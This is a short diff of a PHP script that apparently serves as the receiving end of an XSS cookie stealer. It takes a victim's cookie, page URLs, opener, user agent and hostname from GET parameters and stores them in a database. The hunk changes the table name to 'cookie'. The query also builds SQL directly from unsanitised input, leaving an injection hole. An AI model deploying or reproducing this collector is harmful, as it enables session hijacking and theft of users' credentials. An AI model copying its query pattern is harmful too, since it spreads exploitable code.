@@ -14,7 +14,7 @@ $userAgent=$_GET['userAgent'];
 $hostname=$_GET['hostname'];
 $time=time();
 
-$sql="insert into tu_message (cookie, href, tophref, opener, userAgent, create_time,hostname) VALUES ('{$cookie}', '{$href}', '{$tophref}', '{$opener}', '{$userAgent}', '{$time}', '{$hostname}') ";
+$sql="insert into cookie (cookie, href, tophref, opener, userAgent, create_time,hostname) VALUES ('{$cookie}', '{$href}', '{$tophref}', '{$opener}', '{$userAgent}', '{$time}', '{$hostname}') ";
 $mysqli->query($sql);
 $mysqli->close();
 
